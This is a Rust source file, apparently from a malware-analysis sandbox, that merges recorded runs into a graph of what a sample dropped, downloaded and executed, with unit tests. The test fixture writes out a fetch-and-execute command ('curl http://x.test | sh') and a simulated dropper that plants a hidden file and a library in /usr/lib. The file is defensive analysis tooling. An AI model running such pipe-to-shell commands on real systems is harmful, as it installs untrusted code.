// SPDX-License-Identifier: GPL-3.0-only
//! The lineage graph of a sample: where it came from and what it dropped or
//! ran, merged across its runs. One node per file keyed by SHA-256 (not per
//! process: 512 re-executions of one program are one self-edge), command
//! nodes for `sh -c` style launchers keyed by the command line's hash, system
//! binaries optionally hidden, and levels of parents and children around the
//! sample. Pure: it reads the runs' lineage indexes (`run_digest::Lineage`)
//! and the library's own origin links, so it is the same wherever it is drawn.
use crate::run_digest::Lineage;
use std::collections::{BTreeMap, BTreeSet, VecDeque};

/// What an edge says one file did to another.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum EdgeKind {
    /// The parent wrote the child (also: the child was promoted from it).
    Dropped,
    /// The parent fetched the child from the network. Not in the recording's
    /// index yet; library origins of kind download use it.
    Downloaded,
    /// The parent started the child.
    Executed,
    /// The parent loaded the child. Not in the recording's index yet.
    Loaded,
}

impl EdgeKind {
    pub const ALL: [EdgeKind; 4] = [
        EdgeKind::Dropped,
        EdgeKind::Downloaded,
        EdgeKind::Executed,
        EdgeKind::Loaded,
    ];

    pub fn label(self) -> &'static str {
        match self {
            EdgeKind::Dropped => "dropped",
            EdgeKind::Downloaded => "downloaded",
            EdgeKind::Executed => "executed",
            EdgeKind::Loaded => "loaded",
        }
    }
}

/// How a node is drawn.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum NodeKind {
    /// The sample the window is about.
    Sample,
    /// Another sample of the library.
    Library { name: String, verdict: String },
    /// A file seen in runs with a hash that is not in the library.
    Captured,
    /// A file with no hash (deleted, never captured): keyed by path and run.
    Lost,
    /// A shell or interpreter command line.
    Command,
    /// A base-image program, drawn only when system binaries are shown.
    System,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Node {
    /// SHA-256, `cmd:<sha256 of the command line>`, or `lost:<path>@<run>`.
    pub id: String,
    pub kind: NodeKind,
    /// The name shown: a library name, a file name, or the command line.
    pub label: String,
    pub path: String,
    /// Empty when the hash is unknown.
    pub sha256: String,
    /// Negative for parents, 0 for the sample, positive for children.
    pub level: i32,
    /// Neighbours not drawn at the current levels.
    pub hidden_parents: usize,
    pub hidden_children: usize,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Edge {
    pub from: String,
    pub to: String,
    /// Totals per kind.
    pub kinds: BTreeMap<EdgeKind, u32>,
    /// Run numbers, ascending; empty for an edge of the library's origins
    /// that no run showed.
    pub runs: Vec<usize>,
    /// Per run, per kind: the table behind the label.
    pub per_run: BTreeMap<usize, BTreeMap<EdgeKind, u32>>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Graph {
    pub nodes: Vec<Node>,
    pub edges: Vec<Edge>,
    /// System binaries left out.
    pub hidden_system: usize,
    /// Ancestor and descendant levels that exist, for the steppers.
    pub max_parents: usize,
    pub max_children: usize,
}

/// One run as the graph reads it.
pub struct RunLineage<'a> {
    pub number: usize,
    /// SHA-256 of the sample the run launched.
    pub sample: &'a str,
    /// Where the run started it in the guest.
    pub sample_path: &'a str,
    pub lineage: Option<&'a Lineage>,
}

/// What the library knows about a SHA-256.
pub struct Known {
    pub name: String,
    pub verdict: String,
}

/// An edge between two library samples that no run needs to show: an origin
/// of kind dropped, downloaded or promoted.
pub struct Link {
    pub parent: String,
    pub child: String,
    pub kind: EdgeKind,
    pub run: Option<usize>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Options {
    pub hide_system: bool,
    /// Levels of ancestors and descendants to draw.
    pub parents: usize,
    pub children: usize,
    /// Only this run's contribution.
    pub run: Option<usize>,
    /// Nodes whose hidden neighbours are shown too.
    pub expanded: BTreeSet<String>,
    /// SHA-256 of the base-image programs the runs used (the base image's
    /// manifest, read for them). A program at a system path counts as a
    /// system binary only when its hash is here: a file with an unknown hash
    /// is never hidden.
    pub system: std::sync::Arc<BTreeSet<String>>,
}

impl Default for Options {
    fn default() -> Self {
        Self {
            hide_system: true,
            parents: 1,
            children: 1,
            run: None,
            expanded: BTreeSet::new(),
            system: Default::default(),
        }
    }
}

/// "run 4, 7, 9" for three runs or fewer, "5 runs" for more.
pub fn runs_label(runs: &[usize]) -> String {
    match runs {
        [] => "no run".to_owned(),
        [one] => format!("run {one}"),
        few if few.len() <= 3 => format!(
            "run {}",
            few.iter()
                .map(usize::to_string)
                .collect::<Vec<_>>()
                .join(", ")
        ),
        many => format!("{} runs", many.len()),
    }
}

const SYSTEM_DIRS: [&str; 6] = [
    "/bin/",
    "/sbin/",
    "/usr/bin/",
    "/usr/sbin/",
    "/lib/",
    "/usr/lib/",
];

pub fn system_path(path: &str) -> bool {
    SYSTEM_DIRS.iter().any(|dir| path.starts_with(dir))
}

fn file_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// A command line as its node keys it: whitespace collapsed (the digest keeps
/// the `-c` text without the interpreter's path), so `curl  -s x` and
/// `curl -s x` in two runs are one command.
pub fn normalise_command(command: &str) -> String {
    command.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn command_id(command: &str) -> String {
    format!(
        "cmd:{}",
        crate::storage::sha256_hex(normalise_command(command).as_bytes())
    )
}

#[derive(Default)]
struct Raw {
    nodes: BTreeMap<String, Node>,
    /// (from, to) -> run -> kind -> count
    edges: BTreeMap<(String, String), BTreeMap<usize, BTreeMap<EdgeKind, u32>>>,
    /// Library-origin edges that name no run.
    bare: BTreeMap<(String, String), BTreeMap<EdgeKind, u32>>,
    /// Ids of system binaries found.
    system: BTreeSet<String>,
}

/// The graph of `sample` over `runs` and the library's `links`.
pub fn build(
    sample: &str,
    runs: &[RunLineage<'_>],
    links: &[Link],
    known: &dyn Fn(&str) -> Option<Known>,
    options: &Options,
) -> Graph {
    let mut raw = Raw::default();
    // Paths ever written in any run: a program that was written is not a
    // base-image binary.
    let mut written: BTreeSet<&str> = BTreeSet::new();
    for run in runs {
        for file in run.lineage.iter().flat_map(|lineage| &lineage.files) {
            if file
                .roles
                .iter()
                .any(|role| matches!(role.as_str(), "created" | "written at close" | "changed"))
            {
                written.insert(file.path.as_str());
            }
        }
    }
    let describe = |id: &str, path: &str, sha: &str, number: usize| -> Node {
        let kind = if id == sample {
            NodeKind::Sample
        } else if sha.is_empty() {
            NodeKind::Lost
        } else if let Some(found) = known(sha) {
            NodeKind::Library {
                name: found.name,
                verdict: found.verdict,
            }
        } else if system_path(path) && !written.contains(path) && options.system.contains(sha) {
            NodeKind::System
        } else {
            NodeKind::Captured
        };
        let label = match &kind {
            NodeKind::Library { name, .. } => name.clone(),
            _ if path.is_empty() => format!("{}…", &sha[..sha.len().min(8)]),
            _ => file_name(path).to_owned(),
        };
        let _ = number;
        Node {
            id: id.to_owned(),
            kind,
            label,
            path: path.to_owned(),
            sha256: sha.to_owned(),
            level: 0,
            hidden_parents: 0,
            hidden_children: 0,
        }
    };
    for run in runs {
        if options.run.is_some_and(|only| only != run.number) {
            continue;
        }
        let Some(lineage) = run.lineage else { continue };
        let number = run.number;
        // The id of a path in this run.
        let mut sha_of: BTreeMap<&str, &str> = BTreeMap::new();
        for file in &lineage.files {
            if !file.sha256.is_empty() {
                sha_of.insert(file.path.as_str(), file.sha256.as_str());
            }
        }
        for exec in &lineage.execs {
            if !exec.sha256.is_empty() && exec.command.is_empty() {
                sha_of
                    .entry(exec.path.as_str())
                    .or_insert(exec.sha256.as_str());
            }
        }
        let id_of = |path: &str| -> (String, String) {
            if path == run.sample_path && !run.sample.is_empty() {
                return (run.sample.to_owned(), run.sample.to_owned());
            }
            match sha_of.get(path) {
                Some(sha) => ((*sha).to_owned(), (*sha).to_owned()),
                None => (format!("lost:{path}@{number}"), String::new()),
            }
        };
        // Launchers with one command line stand for their command node.
        let mut commands: BTreeMap<&str, Vec<&str>> = BTreeMap::new();
        for exec in lineage.execs.iter().filter(|exec| !exec.command.is_empty()) {
            commands
                .entry(exec.path.as_str())
                .or_default()
                .push(&exec.command);
        }
        let parent_id = |path: &str| -> Option<(String, String, String)> {
            if path.is_empty() {
                return None;
            }
            if let Some([only]) = commands.get(path).map(Vec::as_slice) {
                return Some((command_id(only), String::new(), (*only).to_owned()));
            }
            let (id, sha) = id_of(path);
            Some((id, sha, path.to_owned()))
        };
        let add = |raw: &mut Raw,
                   from: (String, String, String),
                   to: (String, String, String),
                   kind: EdgeKind,
                   count: u32| {
            for (id, sha, path) in [&from, &to] {
                raw.nodes.entry(id.clone()).or_insert_with(|| {
                    if let Some(command) = id.strip_prefix("cmd:").and(Some(path)) {
                        Node {
                            id: id.clone(),
                            kind: NodeKind::Command,
                            label: format!("$ {command}"),
                            path: path.clone(),
                            sha256: String::new(),
                            level: 0,
                            hidden_parents: 0,
                            hidden_children: 0,
                        }
                    } else {
                        describe(id, path, sha, number)
                    }
                });
                if matches!(raw.nodes[id].kind, NodeKind::System) {
                    raw.system.insert(id.clone());
                }
            }
            if from.0 == to.0 && kind != EdgeKind::Executed {
                return;
            }
            *raw.edges
                .entry((from.0, to.0))
                .or_default()
                .entry(number)
                .or_default()
                .entry(kind)
                .or_default() += count;
        };
        for exec in &lineage.execs {
            let Some(from) = parent_id(&exec.parent) else {
                continue;
            };
            let to = if exec.command.is_empty() {
                let (id, sha) = id_of(&exec.path);
                (id, sha, exec.path.clone())
            } else {
                (
                    command_id(&exec.command),
                    String::new(),
                    exec.command.clone(),
                )
            };
            add(
                &mut raw,
                from,
                to,
                EdgeKind::Executed,
                exec.count.min(u64::from(u32::MAX)) as u32,
            );
        }
        for file in &lineage.files {
            let Some(from) = parent_id(&file.writer) else {
                continue;
            };
            let (id, sha) = id_of(&file.path);
            if id == from.0 {
                continue;
            }
            add(
                &mut raw,
                from,
                (id, sha, file.path.clone()),
                EdgeKind::Dropped,
                1,
            );
        }
    }
    for link in links {
        for id in [&link.parent, &link.child] {
            raw.nodes
                .entry(id.clone())
                .or_insert_with(|| describe(id, "", id, 0));
        }
        let kinds = match link.run {
            Some(number) if options.run.is_none_or(|only| only == number) => {
                *raw.edges
                    .entry((link.parent.clone(), link.child.clone()))
                    .or_default()
                    .entry(number)
                    .or_default()
                    .entry(link.kind)
                    .or_default() += 1;
                continue;
            }
            Some(_) => continue,
            None => raw
                .bare
                .entry((link.parent.clone(), link.child.clone()))
                .or_default(),
        };
        if options.run.is_none() {
            *kinds.entry(link.kind).or_default() += 1;
        }
    }
    raw.nodes
        .entry(sample.to_owned())
        .or_insert_with(|| describe(sample, "", sample, 0))
        .kind = NodeKind::Sample;
    finish(sample, raw, options)
}

fn finish(sample: &str, mut raw: Raw, options: &Options) -> Graph {
    let hidden_system = raw.system.len();
    // Merge the per-run edges into edges between ids.
    let mut edges: BTreeMap<(String, String), Edge> = BTreeMap::new();
    let mut merge = |from: &str, to: &str, run: Option<usize>, kinds: &BTreeMap<EdgeKind, u32>| {
        let edge = edges
            .entry((from.to_owned(), to.to_owned()))
            .or_insert_with(|| Edge {
                from: from.to_owned(),
                to: to.to_owned(),
                kinds: BTreeMap::new(),
                runs: Vec::new(),
                per_run: BTreeMap::new(),
            });
        for (kind, count) in kinds {
            *edge.kinds.entry(*kind).or_default() += count;
            if let Some(run) = run {
                *edge
                    .per_run
                    .entry(run)
                    .or_default()
                    .entry(*kind)
                    .or_default() += count;
            }
        }
        if let Some(run) = run
            && !edge.runs.contains(&run)
        {
            edge.runs.push(run);
        }
    };
    if options.hide_system {
        // What a hidden program did is attributed to its nearest drawn
        // ancestor in the same run.
        let mut per_run: BTreeMap<usize, Vec<RunEdge<'_>>> = BTreeMap::new();
        for ((from, to), runs) in &raw.edges {
            for (run, kinds) in runs {
                per_run.entry(*run).or_default().push((from, to, kinds));
            }
        }
        for (run, list) in &per_run {
            let parent_of: BTreeMap<&String, &String> = list
                .iter()
                .filter(|(_, _, kinds)| kinds.contains_key(&EdgeKind::Executed))
                .map(|(from, to, _)| (*to, *from))
                .collect();
            let drawn_ancestor = |start: &String| -> Option<String> {
                let mut at = start;
                for _ in 0..64 {
                    if !raw.system.contains(at) {
                        return Some(at.clone());
                    }
                    at = parent_of.get(at)?;
                }
                None
            };
            for (from, to, kinds) in list {
                if raw.system.contains(*to) {
                    continue;
                }
                let Some(from) = drawn_ancestor(from) else {
                    continue;
                };
                if &from == *to && !kinds.contains_key(&EdgeKind::Executed) {
                    continue;
                }
                merge(&from, to, Some(*run), kinds);
            }
        }
        raw.nodes.retain(|id, _| !raw.system.contains(id));
    } else {
        for ((from, to), runs) in &raw.edges {
            for (run, kinds) in runs {
                merge(from, to, Some(*run), kinds);
            }
        }
    }
    for ((from, to), kinds) in &raw.bare {
        if raw.nodes.contains_key(from) && raw.nodes.contains_key(to) {
            merge(from, to, None, kinds);
        }
    }
    for edge in edges.values_mut() {
        edge.runs.sort_unstable();
    }
    levels(
        sample,
        raw.nodes,
        edges.into_values().collect(),
        hidden_system,
        options,
    )
}

/// One edge of one run: from, to and what the parent did.
type RunEdge<'a> = (&'a String, &'a String, &'a BTreeMap<EdgeKind, u32>);

/// Distance from the sample along `next`, breadth first.
fn depths(sample: &str, next: &BTreeMap<String, Vec<String>>) -> BTreeMap<String, usize> {
    let mut depth = BTreeMap::from([(sample.to_owned(), 0usize)]);
    let mut queue = VecDeque::from([sample.to_owned()]);
    while let Some(at) = queue.pop_front() {
        let here = depth[&at];
        for other in next.get(&at).into_iter().flatten() {
            if !depth.contains_key(other) {
                depth.insert(other.clone(), here + 1);
                queue.push_back(other.clone());
            }
        }
    }
    depth
}

fn levels(
    sample: &str,
    mut nodes: BTreeMap<String, Node>,
    edges: Vec<Edge>,
    hidden_system: usize,
    options: &Options,
) -> Graph {
    let mut down: BTreeMap<String, Vec<String>> = BTreeMap::new();
    let mut up: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for edge in edges.iter().filter(|edge| edge.from != edge.to) {
        down.entry(edge.from.clone())
            .or_default()
            .push(edge.to.clone());
        up.entry(edge.to.clone())
            .or_default()
            .push(edge.from.clone());
    }
    let child_depth = depths(sample, &down);
    let parent_depth = depths(sample, &up);
    let max_children = child_depth.values().copied().max().unwrap_or(0);
    let max_parents = parent_depth.values().copied().max().unwrap_or(0);
    // A node's level: its distance on the side it is on; the nearer side wins
    // and a tie goes to the children.
    let level_of = |id: &str| -> Option<i32> {
        match (child_depth.get(id), parent_depth.get(id)) {
            (Some(c), Some(p)) if p < c => Some(-(*p as i32)),
            (Some(c), _) => Some(*c as i32),
            (None, Some(p)) => Some(-(*p as i32)),
            (None, None) => None,
        }
    };
    let within = |id: &str| -> bool {
        match level_of(id) {
            Some(level) if level >= 0 => level as usize <= options.children,
            Some(level) => (-level) as usize <= options.parents,
            None => false,
        }
    };
    let mut shown: BTreeSet<String> = nodes.keys().filter(|id| within(id)).cloned().collect();
    // A node expanded with its +N badge shows every neighbour.
    for id in &options.expanded {
        for other in down.get(id).into_iter().chain(up.get(id)).flatten() {
            if level_of(other).is_some() {
                shown.insert(other.clone());
            }
        }
    }
    let mut out = Graph {
        hidden_system,
        max_parents,
        max_children,
        ..Graph::default()
    };
    for (id, node) in nodes.iter_mut() {
        if !shown.contains(id) {
            continue;
        }
        node.level = level_of(id).unwrap_or(0);
        node.hidden_parents = up
            .get(id)
            .into_iter()
            .flatten()
            .filter(|other| !shown.contains(*other))
            .collect::<BTreeSet<_>>()
            .len();
        node.hidden_children = down
            .get(id)
            .into_iter()
            .flatten()
            .filter(|other| !shown.contains(*other))
            .collect::<BTreeSet<_>>()
            .len();
        out.nodes.push(node.clone());
    }
    out.nodes
        .sort_by(|a, b| a.level.cmp(&b.level).then_with(|| a.label.cmp(&b.label)));
    out.edges = edges
        .into_iter()
        .filter(|edge| shown.contains(&edge.from) && shown.contains(&edge.to))
        .collect();
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::run_digest::{LineageExec, LineageFile};

    fn sha(n: u8) -> String {
        format!("{n:02x}").repeat(32)
    }

    fn file(path: &str, hash: &str, roles: &[&str], writer: &str) -> LineageFile {
        LineageFile {
            path: path.into(),
            sha256: hash.into(),
            roles: roles.iter().map(|r| (*r).to_owned()).collect(),
            writer: writer.into(),
        }
    }

    fn exec(parent: &str, path: &str, hash: &str, command: &str, count: u64) -> LineageExec {
        LineageExec {
            parent: parent.into(),
            path: path.into(),
            sha256: hash.into(),
            command: command.into(),
            count,
        }
    }

    /// The default options, with curl's hash in the base image's manifest.
    fn manifest() -> Options {
        Options {
            system: std::sync::Arc::new([sha(9)].into_iter().collect()),
            ..Options::default()
        }
    }

    #[test]
    fn a_program_at_a_system_path_is_hidden_only_when_its_hash_is_in_the_manifest() {
        let me = sha(1);
        let l = lineage();
        let unknown = build(
            &me,
            &[run(1, &me, &l)],
            &[],
            &nobody,
            &Options {
                children: 3,
                ..Options::default()
            },
        );
        assert_eq!(unknown.hidden_system, 0);
        assert!(unknown.nodes.iter().any(|n| n.label == "curl"));
    }

    fn nobody(_: &str) -> Option<Known> {
        None
    }

    /// install.sh runs through `sh -c`, which runs curl (a base binary) and
    /// starts `.x`, which re-executes itself and writes a library.
    fn run(number: usize, sample: &str, lineage: &Lineage) -> RunLineage<'static> {
        // Leaked for the test only: the graph borrows from it.
        let lineage: &'static Lineage = Box::leak(Box::new(lineage.clone()));
        let sample: &'static str = Box::leak(sample.to_owned().into_boxed_str());
        RunLineage {
            number,
            sample,
            sample_path: "/tmp/install.sh",
            lineage: Some(lineage),
        }
    }

    fn lineage() -> Lineage {
        Lineage {
            files: vec![
                file("/tmp/install.sh", "", &["sample"], ""),
                file(
                    "/tmp/.x",
                    &sha(2),
                    &["created", "executed"],
                    "/tmp/install.sh",
                ),
                file("/usr/lib/libhide.so", &sha(3), &["created"], "/tmp/.x"),
                file("/usr/bin/curl", &sha(9), &["executed"], ""),
            ],
            execs: vec![
                exec(
                    "/tmp/install.sh",
                    "/bin/sh",
                    "",
                    "curl http://x.test | sh",
                    1,
                ),
                exec("/bin/sh", "/usr/bin/curl", &sha(9), "", 1),
                exec("/tmp/install.sh", "/tmp/.x", &sha(2), "", 1),
                exec("/tmp/.x", "/tmp/.x", &sha(2), "", 5),
            ],
        }
    }

    #[test]
    fn a_command_is_keyed_by_its_line_with_the_whitespace_collapsed() {
        assert_eq!(
            normalise_command("  curl   -s\thttp://x  "),
            "curl -s http://x"
        );
        assert_eq!(command_id("curl  -s x"), command_id("curl -s x"));
        assert_ne!(command_id("curl -s x"), command_id("curl -s y"));
    }

    #[test]
    fn a_node_per_file_with_a_self_edge_and_command_nodes() {
        let me = sha(1);
        let l = lineage();
        let graph = build(
            &me,
            &[run(1, &me, &l), run(2, &me, &l)],
            &[],
            &nobody,
            &Options {
                children: 3,
                ..manifest()
            },
        );
        let labels: Vec<&str> = graph.nodes.iter().map(|n| n.label.as_str()).collect();
        assert!(labels.contains(&"$ curl http://x.test | sh"), "{labels:?}");
        // .x is one node across two runs and five executions.
        assert_eq!(labels.iter().filter(|l| **l == ".x").count(), 1);
        let selfie = graph.edges.iter().find(|e| e.from == e.to).unwrap();
        assert_eq!(selfie.runs, [1, 2]);
        assert_eq!(selfie.kinds[&EdgeKind::Executed], 10);
        let dropped = graph
            .edges
            .iter()
            .find(|e| e.kinds.contains_key(&EdgeKind::Dropped) && e.to == sha(3))
            .unwrap();
        assert_eq!(dropped.from, sha(2));
        assert_eq!(graph.max_children, 2);
    }

    #[test]
    fn system_binaries_are_hidden_by_default_and_their_work_goes_to_the_command() {
        let me = sha(1);
        let l = lineage();
        let hidden = build(
            &me,
            &[run(1, &me, &l)],
            &[],
            &nobody,
            &Options {
                children: 3,
                ..manifest()
            },
        );
        assert_eq!(hidden.hidden_system, 1);
        assert!(hidden.nodes.iter().all(|n| n.label != "curl"));
        let shown = build(
            &me,
            &[run(1, &me, &l)],
            &[],
            &nobody,
            &Options {
                children: 3,
                hide_system: false,
                ..manifest()
            },
        );
        assert!(
            shown
                .nodes
                .iter()
                .any(|n| n.label == "curl" && n.kind == NodeKind::System)
        );
    }

    #[test]
    fn levels_limit_the_graph_and_the_badge_counts_what_is_left_out() {
        let me = sha(1);
        let l = lineage();
        let one = build(&me, &[run(1, &me, &l)], &[], &nobody, &manifest());
        let ids: Vec<&str> = one.nodes.iter().map(|n| n.label.as_str()).collect();
        assert!(ids.contains(&".x") && !ids.contains(&"libhide.so"));
        let x = one.nodes.iter().find(|n| n.label == ".x").unwrap();
        assert_eq!(x.hidden_children, 1);
        assert_eq!(x.level, 1);
        // Expanding .x shows its child without changing the levels.
        let mut options = manifest();
        options.expanded.insert(sha(2));
        let expanded = build(&me, &[run(1, &me, &l)], &[], &nobody, &options);
        assert!(
            expanded
                .nodes
                .iter()
                .any(|n| n.label == "libhide.so" && n.level == 2)
        );
    }

    #[test]
    fn library_links_add_parents_and_the_run_filter_limits_the_runs() {
        let me = sha(1);
        let parent = sha(7);
        let l = lineage();
        let known = |hash: &str| {
            (hash == parent).then(|| Known {
                name: "kworkerd".into(),
                verdict: "malicious".into(),
            })
        };
        let links = [Link {
            parent: parent.clone(),
            child: me.clone(),
            kind: EdgeKind::Dropped,
            run: Some(13),
        }];
        let graph = build(&me, &[run(1, &me, &l)], &links, &known, &manifest());
        let found = graph.nodes.iter().find(|n| n.id == parent).unwrap();
        assert_eq!(found.level, -1);
        assert!(matches!(&found.kind, NodeKind::Library { name, .. } if name == "kworkerd"));
        let filtered = build(
            &me,
            &[run(1, &me, &l)],
            &links,
            &known,
            &Options {
                run: Some(1),
                ..manifest()
            },
        );
        assert!(filtered.nodes.iter().all(|n| n.id != parent));
    }

    #[test]
    fn a_file_without_a_hash_is_keyed_by_path_and_run_and_never_merged() {
        let me = sha(1);
        let l = Lineage {
            files: vec![file("/tmp/p.bin", "", &["created"], "/tmp/install.sh")],
            execs: Vec::new(),
        };
        let graph = build(
            &me,
            &[run(1, &me, &l), run(2, &me, &l)],
            &[],
            &nobody,
            &manifest(),
        );
        let lost: Vec<&Node> = graph
            .nodes
            .iter()
            .filter(|n| n.kind == NodeKind::Lost)
            .collect();
        assert_eq!(lost.len(), 2);
    }

    #[test]
    fn labels_list_up_to_three_runs_then_count() {
        assert_eq!(runs_label(&[4, 7, 9]), "run 4, 7, 9");
        assert_eq!(runs_label(&[1, 2, 3, 4, 5]), "5 runs");
        assert_eq!(runs_label(&[12]), "run 12");
    }
}
